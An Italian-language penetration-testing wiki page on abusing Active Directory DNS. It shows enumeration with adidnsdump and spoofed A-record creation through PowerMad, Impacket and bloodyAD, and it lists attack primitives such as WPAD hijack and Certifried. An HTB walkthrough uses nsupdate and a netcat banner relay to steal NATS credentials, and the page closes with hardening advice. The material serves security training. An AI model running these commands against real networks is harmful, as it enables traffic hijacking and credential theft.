# Record DNS AD

{{#include ../../banners/hacktricks-training.md}}

Per impostazione predefinita, **qualsiasi utente** in Active Directory può **enumerare tutti i record DNS** nelle zone DNS del Domain o della Forest, in modo simile a un zone transfer (gli utenti possono elencare gli oggetti figlio di una zona DNS in un ambiente AD).

Il tool [**adidnsdump**](https://github.com/dirkjanm/adidnsdump) consente l'**enumerazione** e l'**esportazione** di **tutti i record DNS** nella zona per attività di recon delle reti interne.<sup>[[4]](#references)</sup>
```bash
git clone https://github.com/dirkjanm/adidnsdump
cd adidnsdump
pip install .

# Enumerate the default zone and resolve the "hidden" records
adidnsdump -u domain_name\\username ldap://10.10.10.10 -r

# Quickly list every zone (DomainDnsZones, ForestDnsZones, legacy zones,…)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --print-zones

# Dump a specific zone (e.g. ForestDnsZones)
adidnsdump -u domain_name\\username ldap://10.10.10.10 --zone _msdcs.domain.local -r

cat records.csv
```
>  adidnsdump v1.4.0 (aprile 2025) aggiunge output JSON/Greppable (`--json`), risoluzione DNS multi-thread e supporto per TLS 1.2/1.3 durante il binding a LDAPS

Per ulteriori informazioni, leggi [https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)<sup>[[4]](#references)</sup>

---

## Creazione / modifica dei record (ADIDNS spoofing)

Poiché il gruppo **Authenticated Users** dispone per impostazione predefinita dell'autorizzazione **Create Child** sulla DACL della zona, qualsiasi account di dominio (o account computer) può registrare record aggiuntivi. Questo può essere utilizzato per il dirottamento del traffico, la coercizione di NTLM relay o persino la compromissione completa del dominio.

### PowerMad / Invoke-DNSUpdate (PowerShell)
```powershell
Import-Module .\Powermad.ps1

# Add A record evil.domain.local → attacker IP
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Verbose

# Delete it when done
Invoke-DNSUpdate -DNSType A -DNSName evil -DNSData 10.10.14.37 -Delete -Verbose
```
### Impacket – dnsupdate.py  (Python)
```bash
# add/replace an A record via secure dynamic-update
python3 dnsupdate.py -u 'DOMAIN/user:Passw0rd!' -dc-ip 10.10.10.10 -action add -record evil.domain.local -type A -data 10.10.14.37
```
*(dnsupdate.py è incluso in Impacket ≥0.12.0)*

### BloodyAD
```bash
bloodyAD -u DOMAIN\\user -p 'Passw0rd!' --host 10.10.10.10 dns add A evil 10.10.14.37
```
---

## Primitive di attacco comuni

1. **Wildcard record** – `*.<zone>` trasforma il server AD DNS in un responder aziendale simile allo spoofing LLMNR/NBNS. Può essere usato per catturare hash NTLM o per inoltrarli tramite relay a LDAP/SMB.  (Richiede che la ricerca WINS sia disabilitata.)<sup>[[1]](#references)</sup>
2. **WPAD hijack** – aggiungere `wpad` (oppure un record **NS** che punti a un host dell'attaccante per bypassare il Global-Query-Block-List) e fare da proxy trasparente alle richieste HTTP in uscita per raccogliere credenziali. Microsoft ha corretto i bypass wildcard/DNAME (CVE-2018-8320), ma i **record NS funzionano ancora**.<sup>[[1]](#references)</sup>
3. **Stale entry takeover** – reclamare l'indirizzo IP appartenuto in precedenza a una workstation: la relativa voce DNS continuerà a essere risolta, consentendo attacchi resource-based constrained delegation o Shadow-Credentials senza interagire affatto con il DNS.
4. **DHCP → DNS spoofing** – in una distribuzione Windows DHCP+DNS predefinita, un attaccante non autenticato sulla stessa subnet può sovrascrivere qualsiasi record A esistente (inclusi i Domain Controller) inviando richieste DHCP contraffatte che attivano aggiornamenti DNS dinamici (Akamai “DDSpoof”, 2023). Questo consente un machine-in-the-middle su Kerberos/LDAP e può portare alla compromissione completa del dominio.<sup>[[2]](#references)</sup>
5. **Certifried (CVE-2022-26923)** – modificare il `dNSHostName` di un account computer sotto il proprio controllo, registrare un record A corrispondente, quindi richiedere un certificato per quel nome per impersonare il DC. Strumenti come **Certipy** o **BloodyAD** automatizzano completamente il processo.

---

### Hijacking di servizi interni tramite record dinamici obsoleti (caso di studio NATS)

Quando gli aggiornamenti dinamici restano aperti a tutti gli utenti autenticati, **il nome di un servizio de-registrato può essere reclamato nuovamente e fatto puntare all'infrastruttura dell'attaccante**. Il DC Mirage di HTB esponeva l'hostname `nats-svc.mirage.htb` dopo il DNS scavenging, quindi qualsiasi utente con privilegi ridotti poteva:<sup>[[3]](#references)</sup>

1. **Confermare che il record sia assente** e scoprire la SOA con `dig`:
```bash
dig @dc01.mirage.htb nats-svc.mirage.htb
```
2. **Ricreare il record** verso un'interfaccia esterna/VPN sotto il loro controllo:
```bash
nsupdate
> server 10.10.11.78
> update add nats-svc.mirage.htb 300 A 10.10.14.2
> send
```
3. **Impersonate il servizio in chiaro**. I client NATS si aspettano di vedere un banner `INFO { ... }` prima di inviare le credenziali, quindi copiare un banner legittimo dal broker reale è sufficiente per raccogliere i secret:
```bash
# Capture a single INFO line from the real service and replay it to victims
nc 10.10.11.78 4222 | head -1 | nc -lnvp 4222
```
Qualsiasi client che risolva il nome hijacked farà immediatamente il leak del proprio frame JSON `CONNECT` (inclusi `"user"`/`"pass"`) al listener. Eseguire il binario ufficiale `nats-server -V` sull'host dell'attacker, disabilitare la redazione dei log o semplicemente sniffare la sessione con Wireshark produce le stesse credenziali in chiaro, perché TLS era opzionale.

4. **Pivot con le captured creds** – in Mirage l'account NATS rubato forniva accesso a JetStream, esponendo eventi di autenticazione storici contenenti username/password AD riutilizzabili.

Questo pattern si applica a ogni servizio integrato con AD che si affida a handshake TCP non sicuri (API HTTP, RPC, MQTT, ecc.): una volta hijacked il record DNS, l'attacker diventa il servizio.

---

## Rilevamento e hardening

* Nega agli **Authenticated Users** il diritto *Create all child objects* sulle zone sensibili e delega gli aggiornamenti dinamici a un account dedicato utilizzato da DHCP.
* Se sono necessari aggiornamenti dinamici, imposta la zona su **Secure-only** e abilita **Name Protection** in DHCP, in modo che solo il computer object proprietario possa sovrascrivere il proprio record.
* Monitora gli event ID 257/252 del DNS Server (aggiornamento dinamico), 770 (trasferimento di zona) e le scritture LDAP su `CN=MicrosoftDNS,DC=DomainDnsZones`.
* Blocca i nomi pericolosi (`wpad`, `isatap`, `*`) con un record intenzionalmente benigno o tramite la **Global Query Block List**.
* Mantieni aggiornati i DNS server – ad esempio, le vulnerabilità RCE CVE-2024-26224 e CVE-2024-26231 hanno raggiunto **CVSS 9.8** e sono sfruttabili da remoto contro i Domain Controllers.

## Riferimenti

- [1] [ADIDNS Revisited - WPAD, GQBL e altro](https://www.netspi.com/blog/technical-blog/network-pentesting/adidns-revisited/) (2018, ancora il riferimento de-facto per gli attacchi wildcard/WPAD)
- [2] [Spoofing dei record DNS abusando degli aggiornamenti DNS dinamici di DHCP](https://www.akamai.com/blog/security-research/spoofing-dns-by-abusing-dhcp) (dicembre 2023)
- [3] [HackTheBox Mirage: concatenare NFS Leaks, Dynamic DNS Abuse, NATS Credential Theft, JetStream Secrets e Kerberoasting](https://0xdf.gitlab.io/2025/11/22/htb-mirage.html)
- [4] [Getting in the Zone: dumping del DNS di Active Directory usando adidnsdump](https://dirkjanm.io/getting-in-the-zone-dumping-active-directory-dns-with-adidnsdump/)

{{#include ../../banners/hacktricks-training.md}}
